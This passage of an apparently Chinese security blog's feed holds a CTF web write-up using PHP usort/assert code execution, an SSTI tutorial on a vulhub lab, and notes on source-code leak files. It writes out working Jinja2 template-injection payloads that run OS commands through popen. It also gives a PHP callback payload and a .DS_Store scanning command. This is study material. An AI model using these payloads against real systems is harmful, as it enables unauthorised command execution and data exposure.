/test.php?1[]=test&amp;1[]=var_dump($_SERVER);&amp;2=assert HTTP/1.1<br>Host: localhost:8081<br>Accept: */*<br>Accept-Language: en<br>User-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)<br>Connection: close<br>Content-Type: application/x-www-form-urlencoded<br>Content-Length: 22<br><br>param=usort(...$_GET);<br><br>usort() 使用用户定义的比较函数对数组进行排序<br>usort(array,myfunction) <span class="hljs-built_in"> array </span>必须填写，规定需要排序的数组<br>     myfunction  可选，定义了一个可调用的比较函数的字符串<br>     <br>GET变量被展开成为了两个参数[&#x27;test&#x27;,&#x27;var_dump($_SERVER)&#x27;] 和 assert 传入了usort函数。usort函数的第二个参数是一个回调函数assert，其调用了第一个参数的var_dump($_SERVER),即可执行函数。<br></code></pre></td></tr></table></figure><blockquote><p>开始解题</p></blockquote><p><img src="https://i.loli.net/2020/11/18/AD8K32O9EtQ1wXZ.png" alt="image-20201118000348977"></p><p>获取flag  直接使用 cat /f*</p><p><img src="https://i.loli.net/2020/11/18/3ZCv6k8XKfVhdGI.png" alt="image-20201118001001096"></p>]]></content>
    
    
    <summary type="html">&lt;h2 id=&quot;WEB&quot;&gt;&lt;a href=&quot;#WEB&quot; class=&quot;headerlink&quot; title=&quot;WEB&quot;&gt;&lt;/a&gt;WEB&lt;/h2&gt;&lt;p&gt;[TOC]&lt;/p&gt;</summary>
    
    
    
    
    <category term="Web" scheme="http://example.com/tags/Web/"/>
    
    <category term="WriteUp" scheme="http://example.com/tags/WriteUp/"/>
    
  </entry>
  
  <entry>
    <title>SSTI-Study</title>
    <link href="http://example.com/2020/11/12/SSTI-Study/"/>
    <id>http://example.com/2020/11/12/SSTI-Study/</id>
    <published>2020-11-12T11:56:14.000Z</published>
    <updated>2020-12-22T11:43:19.316Z</updated>
    
    <content type="html"><![CDATA[<h4 id="注入大致流程"><a href="#注入大致流程" class="headerlink" title="注入大致流程"></a>注入大致流程</h4><figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs angelscript"><span class="hljs-number">1.</span> 检测漏洞，寻找注入点<br><span class="hljs-number">2.</span>查询基本类<br><span class="hljs-number">3.</span>查找子类<br><span class="hljs-number">4.</span>找到子类中可以读取文件或命令执行的模块<br></code></pre></td></tr></table></figure><blockquote><p>搭建的是vulhub的ssti靶场</p></blockquote><a id="more"></a><h3 id="查询注入点"><a href="#查询注入点" class="headerlink" title="查询注入点"></a>查询注入点</h3><p><img src="https://i.loli.net/2020/11/12/4Tg2eSL6FMxkZf9.png" alt="image-20201112172534902"></p><h3 id="查看基本类"><a href="#查看基本类" class="headerlink" title="查看基本类"></a>查看基本类</h3><figure class="highlight sqf"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs sqf">?<span class="hljs-built_in">name</span>=&#123;&#123;<span class="hljs-string">&#x27;&#x27;</span>.<span class="hljs-variable">__class__</span>.<span class="hljs-variable">__base__</span>&#125;&#125;<br>?<span class="hljs-built_in">name</span>=&#123;&#123;<span class="hljs-string">&#x27;&#x27;</span>.<span class="hljs-variable">__class__</span>.<span class="hljs-variable">__mro__</span>&#125;&#125;<br>?<span class="hljs-built_in">name</span>=&#123;&#123;<span class="hljs-string">&#x27;&#x27;</span>.<span class="hljs-variable">__class__</span>.<span class="hljs-variable">__mro__</span>[<span class="hljs-number">0</span>]&#125;&#125;<br></code></pre></td></tr></table></figure><p><img src="https://i.loli.net/2020/11/12/Nrv4CEonVlPt9QJ.png" alt="image-20201112172830078"></p><p><img src="https://i.loli.net/2020/11/12/kK4tRx3jrGNvypf.png" alt="image-20201112172810920"></p><p><img src="https://i.loli.net/2020/11/12/KhoCuX8tMD4pFYz.png" alt="image-20201112172948831"></p><h3 id="查看子类"><a href="#查看子类" class="headerlink" title="查看子类"></a>查看子类</h3><figure class="highlight handlebars"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs handlebars"><span class="xml">查看所有子类</span><br><span class="xml">?name=</span><span class="hljs-template-variable">&#123;&#123;<span class="hljs-name">&#x27;&#x27;.__class__.__base__.subclasses__</span>()&#125;&#125;</span><br><span class="xml">?name=</span><span class="hljs-template-variable">&#123;&#123;<span class="hljs-name">&#x27;&#x27;.__class__.__mro__[1].__subclasses__</span>()&#125;&#125;</span><br><span class="xml">查看某一个子类</span><br><span class="xml">?name=</span><span class="hljs-template-variable">&#123;&#123;<span class="hljs-name">&#x27;&#x27;.__class__.__base__.subclasses__</span>()[166]&#125;&#125;</span><br><span class="xml">?name=</span><span class="hljs-template-variable">&#123;&#123;<span class="hljs-name">&#x27;&#x27;.__class__.__mro__[1].__subclasses__</span>()[166]&#125;&#125;</span><br></code></pre></td></tr></table></figure><p><img src="https://i.loli.net/2020/11/12/6F1W9GxwE4NbrKD.png" alt="image-20201112183533974"></p><p><img src="https://i.loli.net/2020/11/12/6xcTyqzGDjJnk94.png" alt="image-20201112183911218"></p><h3 id="查看166号子类的模板"><a href="#查看166号子类的模板" class="headerlink" title="查看166号子类的模板"></a>查看166号子类的模板</h3><figure class="highlight reasonml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs reasonml">?name=&#123;&#123;&#x27;&#x27;.<span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">__class__</span>.</span><span class="hljs-module"><span class="hljs-identifier">__mro__</span>[</span></span><span class="hljs-number">1</span>].<span class="hljs-constructor">__subclasses__()</span><span class="hljs-literal">[<span class="hljs-number">166</span>]</span>.<span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">__init__</span>.</span><span class="hljs-module"><span class="hljs-identifier">__globals__</span>&#125;</span></span>&#125;<br>?name=&#123;&#123;&#x27;&#x27;.<span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">__class__</span>.</span><span class="hljs-module"><span class="hljs-identifier">__base__</span>.</span><span class="hljs-module"><span class="hljs-identifier">__subclasses__</span>(</span></span>)<span class="hljs-literal">[<span class="hljs-number">166</span>]</span>.<span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">__init__</span>.</span><span class="hljs-module"><span class="hljs-identifier">__globals__</span>&#125;</span></span>&#125;<br></code></pre></td></tr></table></figure><p><img src="https://i.loli.net/2020/11/12/6tdi7SxupBJh3qW.png" alt="image-20201112184228318"></p><h3 id="查看166号子类的模板中的函数"><a href="#查看166号子类的模板中的函数" class="headerlink" title="查看166号子类的模板中的函数"></a>查看166号子类的模板中的函数</h3><figure class="highlight sqf"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs sqf">?<span class="hljs-built_in">name</span>=&#123;&#123;<span class="hljs-string">&#x27;&#x27;</span>.<span class="hljs-variable">__class__</span>.<span class="hljs-variable">__base__</span>.<span class="hljs-variable">__subclasses__</span>()[<span class="hljs-number">166</span>].<span class="hljs-variable">__init__</span>.<span class="hljs-variable">__globals__</span>[<span class="hljs-string">&#x27;__builtins__&#x27;</span>]&#125;&#125;<br>?<span class="hljs-built_in">name</span>=&#123;&#123;<span class="hljs-string">&#x27;&#x27;</span>.<span class="hljs-variable">__class__</span>.<span class="hljs-variable">__mro__</span>[<span class="hljs-number">1</span>].<span class="hljs-variable">__subclasses__</span>()[<span class="hljs-number">166</span>].<span class="hljs-variable">__init__</span>.<span class="hljs-variable">__globals__</span>[<span class="hljs-string">&#x27;__builtins__&#x27;</span>]&#125;&#125;<br></code></pre></td></tr></table></figure><p><img src="https://i.loli.net/2020/11/12/ajHSTDWmh1w6ZgI.png" alt="image-20201112185201824"></p><h3 id="利用函数构造payload"><a href="#利用函数构造payload" class="headerlink" title="利用函数构造payload"></a>利用函数构造payload</h3><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs markdown">?name=&#123;&#123;&#x27;&#x27;.<span class="hljs-strong">__class__</span>.<span class="hljs-strong">__base__</span>.<span class="hljs-strong">__subclasses__</span>()[<span class="hljs-string">166</span>].<span class="hljs-strong">__init__</span>.<span class="hljs-strong">__globals__</span>[<span class="hljs-string">&#x27;__builtins__&#x27;</span>][<span class="hljs-symbol">&#x27;eval&#x27;</span>](&quot;<span class="hljs-strong">__import__</span>(&#x27;os&#x27;).popen(&#x27;ls&#x27;).read()&quot;)&#125;&#125;<br></code></pre></td></tr></table></figure><p><img src="https://i.loli.net/2020/11/12/o5tah4QlVHFZbxI.png" alt="image-20201112185822710"></p><blockquote><p>理解不一定对</p></blockquote><h3 id="常见的payload"><a href="#常见的payload" class="headerlink" title="常见的payload"></a>常见的payload</h3><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs markdown">?name=&#123;&#123;&#x27;&#x27;.<span class="hljs-strong">__class__</span>.<span class="hljs-strong">__base__</span>.<span class="hljs-strong">__subclasses__</span>()[166].<span class="hljs-strong">__init__</span>.<span class="hljs-strong">__globals__</span>.<span class="hljs-strong">__builtins__</span>.<span class="hljs-strong">__import__</span>(&#x27;os&#x27;).popen(&#x27;id&#x27;).read()&#125;&#125;<br>?name=&#123;&#123;&#x27;&#x27;.<span class="hljs-strong">__class__</span>.<span class="hljs-strong">__base__</span>.<span class="hljs-strong">__subclasses__</span>()[<span class="hljs-string">166</span>].<span class="hljs-strong">__init__</span>.<span class="hljs-strong">__globals__</span>[<span class="hljs-string">&#x27;__builtins__&#x27;</span>][<span class="hljs-symbol">&#x27;__import__&#x27;</span>](&#x27;os&#x27;).popen(&#x27;id&#x27;).read()&#125;&#125;<br></code></pre></td></tr></table></figure><blockquote><p>后面还需要熟练掌握各种绕过方法</p></blockquote>]]></content>
    
    
    <summary type="html">&lt;h4 id=&quot;注入大致流程&quot;&gt;&lt;a href=&quot;#注入大致流程&quot; class=&quot;headerlink&quot; title=&quot;注入大致流程&quot;&gt;&lt;/a&gt;注入大致流程&lt;/h4&gt;&lt;figure class=&quot;highlight angelscript&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;4&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;code class=&quot;hljs angelscript&quot;&gt;&lt;span class=&quot;hljs-number&quot;&gt;1.&lt;/span&gt; 检测漏洞，寻找注入点&lt;br&gt;&lt;span class=&quot;hljs-number&quot;&gt;2.&lt;/span&gt;查询基本类&lt;br&gt;&lt;span class=&quot;hljs-number&quot;&gt;3.&lt;/span&gt;查找子类&lt;br&gt;&lt;span class=&quot;hljs-number&quot;&gt;4.&lt;/span&gt;找到子类中可以读取文件或命令执行的模块&lt;br&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;

&lt;blockquote&gt;
&lt;p&gt;搭建的是vulhub的ssti靶场&lt;/p&gt;
&lt;/blockquote&gt;</summary>
    
    
    
    
    <category term="Web" scheme="http://example.com/tags/Web/"/>
    
  </entry>
  
  <entry>
    <title>源码泄露</title>
    <link href="http://example.com/2020/10/31/%E6%BA%90%E7%A0%81%E6%B3%84%E9%9C%B2/"/>
    <id>http://example.com/2020/10/31/%E6%BA%90%E7%A0%81%E6%B3%84%E9%9C%B2/</id>
    <published>2020-10-31T14:01:05.000Z</published>
    <updated>2020-12-22T11:42:08.572Z</updated>
    
    <content type="html"><![CDATA[<h3 id="hg-源码泄露"><a href="#hg-源码泄露" class="headerlink" title=".hg 源码泄露"></a>.hg 源码泄露</h3><p>漏洞成因：hg init的时候会生成.hg</p><a id="more"></a><h3 id="git-源码泄露"><a href="#git-源码泄露" class="headerlink" title=".git 源码泄露"></a>.git 源码泄露</h3><p>漏洞成因：在运行git init 初始化代码库的时候，会生成一个.git隐藏文件</p><h3 id="DS-Store文件泄露"><a href="#DS-Store文件泄露" class="headerlink" title=".DS_Store文件泄露"></a>.DS_Store文件泄露</h3><p>泄露成因：在发布代码时未删除文件夹中隐藏.DS_Store，被发现后，获取了敏感的文件名等信息</p><p>路径检查工具：dsstoreexp</p><p><code>python ds_store_exp.py http://www.am0s.com/.DS_Store</code></p><h3 id="网站备份压缩文件"><a href="#网站备份压缩文件" class="headerlink" title="网站备份压缩文件"></a>网站备份压缩文件</h3><p>备份文件的后缀：.rar .zip .7z .tar.gz .bak  .swp .txt .html</p><h3 id="SVN导致文件泄露"><a href="#SVN导致文件泄露" class="headerlink" title="SVN导致文件泄露"></a>SVN导致文件泄露</h3><p>Subversion，简称SVN，是一个开放源代码的版本控制系统，相对于的RCS、CVS，采用了分支管理系统，它的设计目标就是取代CVS。互联网上越来越多的控制服务从CVS转移到Subversion。Subversion使用服务端—客户端的结构，当然服务端与客户端可以都运行在同一台服务器上。在服务端是存放着所有受控制数据的Subversion仓库，另一端是Subversion的客户端程序，管理着受控数据的一部分在本地的映射（称为“工作副本”）。在这两端之间，是通过各种仓库存取层（Repository Access，简称RA）的多条通道进行访问的。这些通道中，可以通过不同的网络协议，例如HTTP、SSH等，或本地文件的方式来对仓库进行操作。</p><h3 id="WEB-INF-web-xml泄露"><a href="#WEB-INF-web-xml泄露" class="headerlink" title="WEB-INF/web.xml泄露"></a>WEB-INF/web.xml泄露</h3><p>WEB-INF是Java的WEB应用的安全目录。如果想在页面中直接访问其中的文件，必须通过web.xml文件对要访问的文件进行相应映射才能访问。</p><table><thead><tr><th>目录</th><th>内容</th></tr></thead><tbody><tr><td>/WEB-INF/web.xml</td><td>web应用配置文件，描述了servlet和其他的应用组件配置及命名规则</td></tr><tr><td>/WEB-INF/classes/</td><td>站点所有用的 class 文件，包括 servlet class 和非servlet class</td></tr><tr><td>/WEB-INF/lib/</td><td>存放web应用需要的各种JAR文件，放置仅在这个应用中要求使用的jar文件</td></tr><tr><td>/WEB-INF/src/</td><td>源码目录，按照包名结构放置各个java文件</td></tr><tr><td>/WEB-INF/database.properties</td><td>数据库配置文件</td></tr></tbody></table><h3 id="CVS泄露"><a href="#CVS泄露" class="headerlink" title="CVS泄露"></a>CVS泄露</h3>]]></content>
    
    
    <summary type="html">&lt;h3 id=&quot;hg-源码泄露&quot;&gt;&lt;a href=&quot;#hg-源码泄露&quot; class=&quot;headerlink&quot; title=&quot;.hg 源码泄露&quot;&gt;&lt;/a&gt;.hg 源码泄露&lt;/h3&gt;&lt;p&gt;漏洞成因：hg init的时候会生成.hg&lt;/p&gt;</summary>
    
    
    
    
    <category term="Web" scheme="http://example.com/tags/Web/"/>
    
  </entry>
  
</feed>
